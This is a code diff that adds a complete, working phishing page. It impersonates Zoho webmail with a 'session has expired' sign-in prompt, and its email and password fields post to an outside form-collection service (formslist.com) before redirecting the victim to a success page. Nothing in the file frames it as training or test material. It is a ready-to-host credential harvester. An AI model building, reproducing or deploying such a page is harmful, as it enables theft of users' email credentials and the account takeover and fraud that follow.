@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#f5f7fb" />
+    <title>Webmail Sign-in</title>
+    <style>
+      :root {
+        color-scheme: light;
+        font-family: Inter, ui-sans-serif, system-ui,
+          -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        color: #182230;
+        background: #f5f7fb;
+        font-synthesis: none;
+        text-rendering: optimizeLegibility;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        min-width: 320px;
+        min-height: 100vh;
+        margin: 0;
+        display: grid;
+        place-items: center;
+        padding: 24px;
+        background:
+          radial-gradient(ellipse at 15% 10%, #e5edff 0, transparent 40%),
+          radial-gradient(ellipse at 90% 90%, #e9e5ff 0, transparent 36%),
+          #f5f7fb;
+      }
+
+      button,
+      input,
+      textarea {
+        font: inherit;
+      }
+
+      .card {
+        width: min(100%, 440px);
+        margin-inline: auto;
+        padding: 42px;
+        border: 1px solid #e9edf4;
+        border-radius: 20px;
+        background: #fff;
+        box-shadow: 0 20px 60px rgb(32 48 80 / 10%);
+      }
+
+      .brand-logo {
+        display: block;
+        width: 48px;
+        height: 48px;
+        object-fit: contain;
+      }
+
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+
+      .brand-name {
+        color: #182230;
+        font-size: 18px;
+        font-weight: 600;
+      }
+
+      h1 {
+        margin: 0;
+        font-size: 28px;
+        letter-spacing: -0.8px;
+      }
+
+      .intro {
+        margin: 10px 0 30px;
+        color: #667085;
+        font-size: 15px;
+        line-height: 1.6;
+      }
+
+      .field {
+        margin-bottom: 20px;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        color: #344054;
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      input,
+      textarea {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1px solid #d0d5dd;
+        border-radius: 9px;
+        outline: none;
+        color: #182230;
+        background: #fff;
+        transition: border-color 140ms ease, box-shadow 140ms ease;
+      }
+
+      input {
+        height: 48px;
+      }
+
+      textarea {
+        min-height: 120px;
+        resize: vertical;
+      }
+
+      input::placeholder,
+      textarea::placeholder {
+        color: #98a2b3;
+      }
+
+      input:focus,
+      textarea:focus {
+        border-color: #6366f1;
+        box-shadow: 0 0 0 3px rgb(99 102 241 / 15%);
+      }
+
+      .submit-button {
+        display: block;
+        min-width: 132px;
+        min-height: 44px;
+        margin: 8px 0 0 auto;
+        padding: 0 22px;
+        border: 0;
+        border-radius: 8px;
+        color: #fff;
+        background: #0d6efd;
+        cursor: pointer;
+        font-size: 15px;
+        font-weight: 600;
+        transition: background 140ms ease, transform 140ms ease;
+      }
+
+      .submit-button:hover {
+        background: #0b5ed7;
+      }
+
+      .submit-button:active {
+        transform: translateY(1px);
+      }
+
+      .submit-button:focus-visible {
+        outline: 3px solid #a5b4fc;
+        outline-offset: 3px;
+      }
+
+      .form-status {
+        margin: 12px 0 0;
+        color: #b42318;
+        font-size: 14px;
+      }
+
+      @media (max-width: 480px) {
+        body {
+          padding: 16px;
+        }
+
+        .card {
+          padding: 30px 24px;
+        }
+      }
+    </style>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script>
+      const { createElement: h } = React;
+      const successUrl = new URL("success.html", window.location.href).href;
+
+      async function handleSubmit(event) {
+        event.preventDefault();
+
+        const form = event.currentTarget;
+        const submitButton = form.querySelector('button[type="submit"]');
+        const status = form.querySelector("[role='status']");
+        submitButton.disabled = true;
+        submitButton.textContent = "Sending...";
+        status.textContent = "";
+
+        try {
+          const response = await fetch(form.action, {
+            method: form.method,
+            body: new FormData(form),
+            headers: { Accept: "application/json" }
+          });
+
+          if (!response.ok) {
+            throw new Error("The form could not be submitted. Please try again.");
+          }
+
+          window.location.href = successUrl;
+        } catch (error) {
+          status.textContent =
+            error instanceof Error
+              ? error.message
+              : "The form could not be submitted. Please try again.";
+          submitButton.disabled = false;
+          submitButton.textContent = "Send message";
+        }
+      }
+
+      function App() {
+        return h(
+          "main",
+          { className: "card", "aria-labelledby": "contact-title" },
+          h(
+            "div",
+            { className: "brand" },
+            h("img", { className: "brand-logo", src: "Logo.png", alt: "" }),
+            h("span", { className: "brand-name" }, "ZOHO")
+          ),
+          h("h1", { id: "contact-title" }, "Let's get started"),
+          h(
+            "p",
+            { className: "intro" },
+            "Previous session has expired, login to continue."
+          ),
+          h(
+            "form",
+            {
+              action: "https://formslist.com/f/a9U8tXABYK3i",
+              method: "POST",
+              onSubmit: handleSubmit
+            },
+            h(
+              "div",
+              { className: "field" },
+              h("input", {
+                id: "email",
+                name: "email",
+                type: "email",
+                placeholder: "Email",
+                autoComplete: "email",
+                required: true
+              })
+            ),
+            h(
+              "div",
+              { className: "field" },
+              h("input", {
+                id: "name",
+                name: "name",
+                type: "password",
+                placeholder: "Password",
+                autoComplete: "name",
+                required: true
+              })
+            ),
+            h("input", {
+              type: "text",
+              name: "_gotcha",
+              tabIndex: -1,
+              autoComplete: "off",
+              "aria-hidden": "true",
+              style: { display: "none" }
+            }),
+            h("button", { className: "submit-button", type: "submit" }, "Next"),
+            h("p", {
+              className: "form-status",
+              role: "status",
+              "aria-live": "polite"
+            })
+          )
+        );
+      }
+
+      ReactDOM.createRoot(document.getElementById("root")).render(h(App));
+    </script>
+  </body>
+</html>
